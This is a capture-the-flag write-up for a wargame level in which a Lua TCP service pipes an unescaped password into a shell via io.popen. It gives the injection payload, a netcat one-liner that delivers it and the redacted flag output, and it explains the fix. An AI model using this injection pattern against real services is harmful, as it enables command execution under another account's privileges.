# Level 11

## 1. Target Information
- **User:** `level11`
- **Password:** `***FLAG10***`
- **Target:** `flag11`
- **SSH Port:** `4242`

---

## 2. Reconnaissance & Discovery
Look at the home directory:

```bash
ls -la
cat level11.lua
```

**Findings:**
- A single Lua script `level11.lua` owned by `flag11`. There is no binary and no token file — the secret is reached through a running service.
- The script binds a TCP server on `127.0.0.1:5151`, prompts for a `Password:`, hashes it, and compares the hash to a hardcoded value:

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
end

...
local h = hash(l)
if h ~= "***SHA1_LEVEL11***" then
    client:send("Erf nope..\n");
else
    client:send("Gz you dumb*\n")
end
```

### Confirm who runs the service
```bash
ps aux | grep -i lua
# flag11 ... lua /.../level11.lua
nc 127.0.0.1 5151
# Password:
```
**Key observations:**
- The server process runs as **flag11**, so anything the script executes runs with flag11's privileges.
- The "match the hash" path is a **trap**: landing in the `else` branch only prints `Gz you dumb*` — no `getflag`, no token. Cracking or forging the SHA‑1 (john, hash-replay tricks) leads nowhere by design.
- The real sink is `io.popen("echo "..pass.." | sha1sum")`: the password is pasted **raw into a shell command** with no quoting or escaping.

---

## 3. Vulnerability Analysis
- **Flaw Type:** Shell command injection via unsanitized input passed to `io.popen`.
- **Technical Explanation:**
  - `io.popen("echo "..pass.." | sha1sum")` concatenates attacker input directly into a string handed to `/bin/sh`. Any shell metacharacter (`;`, `|`, `$()`, backticks) in `pass` breaks out of the intended `echo … | sha1sum` and runs arbitrary commands.
  - Those commands execute as **flag11** (the service owner), so we can run `getflag` with flag11's identity even though we connected as `level11`.
  - The hash comparison is irrelevant to the exploit — we never need it to match. The script also discards the command output (it keeps only 40 chars for the comparison and never sends it back), so the injected command must **exfiltrate** its result to a path we can read, e.g. a world-readable file in `/tmp`.
  - **Root cause / fix:** never build a shell command by string concatenation with untrusted input. Pass arguments to a program without an intervening shell, or strictly validate/escape the input. A password check also should never shell out to `echo … | sha1sum` in the first place — use a library hash function, and compare in constant time.

---

## 4. Exploitation Walkthrough

### Step 1: Connect to the service and inject
At the `Password:` prompt (via `nc 127.0.0.1 5151`), send:

```text
x; getflag > /tmp/leak; echo
```

The shell the script runs becomes:

```bash
echo x; getflag > /tmp/leak; echo | sha1sum
```
- `echo x` — harmless filler that satisfies the leading `echo`.
- `getflag > /tmp/leak` — runs `getflag` as flag11 and writes the token to `/tmp/leak`.
- `echo | sha1sum` — the leftover tail of the original command, harmless.

One-liner version (no interactive prompt needed):
```bash
printf 'x; getflag > /tmp/leak; echo\n' | nc -q1 127.0.0.1 5151
```

### Step 2: Read the exfiltrated token
`/tmp/leak` is created by flag11 with default (world-readable) permissions, so `level11` can read it:
```bash
cat /tmp/leak
# Check flag.Here is your token: ***FLAG11***
```
The injection already ran `getflag` as flag11, so `***FLAG11***` is the
**level12 password** directly — no `su flag11` is needed.

---

## 5. Flag
```text
Check flag.Here is your token: ***FLAG11***
```
- **Next Level User:** `level12`
- **Password for next level:** `***FLAG11***`
